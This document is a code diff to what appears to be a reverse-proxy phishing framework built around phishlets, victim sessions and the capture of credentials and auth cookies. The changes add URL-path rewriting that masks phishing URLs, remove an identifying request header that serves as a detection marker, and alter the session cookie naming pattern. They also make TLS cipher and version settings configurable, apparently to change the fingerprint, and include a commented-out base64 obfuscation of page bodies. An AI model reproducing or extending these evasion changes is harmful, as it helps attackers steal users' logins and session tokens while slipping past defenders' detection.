@@ -82,6 +82,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	url_map           map[string]string  // NEW: Maps fake_path -> original_full_url
+	url_map_mtx       sync.RWMutex       // NEW: Mutex for thread-safe URL map access
 }
 
 type ProxySession struct {
@@ -143,6 +145,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
+	p.url_map = make(map[string]string)
 
 	p.Proxy.Verbose = false
 
@@ -466,7 +469,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -651,6 +653,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// Apply URL parameter rewrites or restore from mapping
+				if pl != nil {
+					restored := false
+					
+					// Check if this path has a stored mapping (incoming request from victim)
+					p.url_map_mtx.RLock()
+					if originalUrl, exists := p.url_map[req.URL.Path]; exists {
+						p.url_map_mtx.RUnlock()
+						
+						// Restore the complete original URL
+						parsedOriginal, err := url.Parse(originalUrl)
+						if err == nil {
+							req.URL.Path = parsedOriginal.Path
+							req.URL.RawQuery = parsedOriginal.RawQuery
+							restored = true
+							log.Debug("url_mapping: restored %s -> %s", req.URL.Path, originalUrl)
+						}
+					} else {
+						p.url_map_mtx.RUnlock()
+					}
+					
+					// If not restored from map, apply rewrite rules (outgoing URL)
+					if !restored {
+						req.URL, _ = p.rewriteUrlParams(pl, req.URL, req.Host)
+					}
+				}
+
 				// patch GET query params with original domains
 				if pl != nil {
 					qs := req.URL.Query()
@@ -666,7 +695,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -942,17 +970,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
+			pl := p.getPhishletByOrigHost(req_hostname)
+
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
+				orig_host := r_url.Host  // NEW: Store original host
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
+					r_url, _ = p.rewriteUrlParams(pl, r_url, orig_host)  // NEW: Apply URL rewrites
 					resp.Header.Set("Location", r_url.String())
 				}
 			}
 
 			// fix cookies
-			pl := p.getPhishletByOrigHost(req_hostname)
 			var auth_tokens map[string][]*CookieAuthToken
 			if pl != nil {
 				auth_tokens = pl.cookieAuthTokens
@@ -1186,6 +1217,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 						}
 					}
+					// Base64 encode the body
+					//encodedBody := base64.StdEncoding.EncodeToString(body)
+					//body = []byte(fmt.Sprintf("<script>document.write(decodeURIComponent(atob('%s')));</script>", encodedBody))
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1539,43 +1573,51 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 }
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
-		port := 443
-		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
-		}
+        return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+                parts := strings.SplitN(host, ":", 2)
+                hostname := parts[0]
+                port := 443
+                if len(parts) == 2 {
+                        port, _ = strconv.Atoi(parts[1])
+                }
 
-		tls_cfg := &tls.Config{}
-		if !p.developer {
+                tls_cfg := &tls.Config{
+                    CipherSuites:             p.cfg.general.CipherSuites,
+                    PreferServerCipherSuites: false,
+                    MinVersion:               p.cfg.general.TLSMinVersion,
+                    MaxVersion:               p.cfg.general.TLSMaxVersion,
+                }
+                if !p.developer {
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
+                        tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
+                        tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.Nex>
 
-			return tls_cfg, nil
-		} else {
-			var ok bool
-			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
-			}
-
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-			if err != nil {
-				log.Error("http_proxy: %s", err)
-				return nil, err
-			}
-			return &tls.Config{
-				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
-			}, nil
-		}
-	}
+                        return tls_cfg, nil
+                } else {
+                        var ok bool
+                        phish_host := ""
+                        if !p.cfg.IsLureHostnameValid(hostname) {
+                                phish_host, ok = p.replaceHostWithPhished(hostname)
+                                if !ok {
+                                        log.Debug("phishing hostname not found: %s", hostname)
+                                        return nil, fmt.Errorf("phishing hostname not found")
+                                }
+                        }
+                        cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+                        if err != nil {
+                                log.Error("http_proxy: %s", err)
+                                return nil, err
+                        }
+                        return &tls.Config{
+                                InsecureSkipVerify: true,
+                                Certificates:       []tls.Certificate{*cert},
+                                CipherSuites:       p.cfg.general.CipherSuites,
+                                PreferServerCipherSuites: false,
+                                MinVersion:         p.cfg.general.TLSMinVersion,
+                                MaxVersion:         p.cfg.general.TLSMaxVersion,
+                        }, nil
+                }
+        }
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
@@ -1758,15 +1800,96 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	return hostname, false
 }
 
+// Modified version //
 func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
 	r_url, err := url.Parse(u)
 	if err == nil {
+		orig_host := r_url.Host  // NEW: Store original host
 		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 			r_url.Host = r_host
+			// NEW: Try to find phishlet and apply URL rewrites
+			if pl := p.getPhishletByPhishHost(r_url.Host); pl != nil {
+				r_url, _ = p.rewriteUrlParams(pl, r_url, orig_host)
+			}
 			return r_url.String(), true
 		}
 	}
 	return u, false
+}
+
+// NEW //
+func (p *HttpProxy) rewriteUrlParams(pl *Phishlet, u *url.URL, hostname string) (*url.URL, bool) {
+	if pl == nil || len(pl.urlRewrite) == 0 {
+		return u, false
+	}
+	
+	modified := false
+	query := u.Query()
+	original_full_uri := u.RequestURI()
+	
+	for _, rule := range pl.urlRewrite {
+		// Check if rule applies to this domain
+		if rule.domain != "" {
+			if !strings.Contains(strings.ToLower(hostname), strings.ToLower(rule.domain)) {
+				continue
+			}
+		}
+		
+		// Check if rule applies to this path
+		if rule.path != nil {
+			if !rule.path.MatchString(u.Path) {
+				continue
+			}
+		}
+		
+		// Apply Full Path Rewrite
+		if rule.path != nil {
+			// Replace the path using regex
+			u.Path = rule.path.ReplaceAllString(u.Path, rule.value)
+			modified = true
+			
+			// Clear existing query parameters if requested
+			if rule.clear_params {
+				if len(rule.exclude_keys) > 0 {
+					newQuery := url.Values{}
+					for _, k := range rule.exclude_keys {
+						if v, ok := query[k]; ok {
+							newQuery[k] = v
+						}
+					}
+					query = newQuery
+				} else {
+					query = url.Values{}
+				}
+			}
+			
+			// Add new query parameters if specified
+			if len(rule.params) > 0 {
+				for _, p := range rule.params {
+					query.Set(*p.Key, *p.Value)
+				}
+			}
+			
+			log.Debug("url_rewrite: rewrite path to '%s' with query '%s'", u.Path, query.Encode())
+			
+			// Store bidirectional mapping
+			p.url_map_mtx.Lock()
+			fullOriginalUrl := "https://" + hostname
+			if strings.HasPrefix(original_full_uri, "/") {
+				fullOriginalUrl += original_full_uri
+			} else {
+				fullOriginalUrl += "/" + original_full_uri
+			}
+			p.url_map[u.Path] = fullOriginalUrl
+			p.url_map_mtx.Unlock()
+		}
+	}
+	
+	if modified {
+		u.RawQuery = query.Encode()
+	}
+	
+	return u, modified
 }
 
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
@@ -1798,9 +1921,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
@@ -1993,7 +2113,6 @@ func getContentType(path string, data []byte) string {
 
 func getSessionCookieName(pl_name string, cookie_name string) string {
 	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
-	s_hash := fmt.Sprintf("%x", hash[:4])
-	s_hash = s_hash[:4] + "-" + s_hash[4:]
+	s_hash := fmt.Sprintf("%x", hash[:8])
 	return s_hash
 }
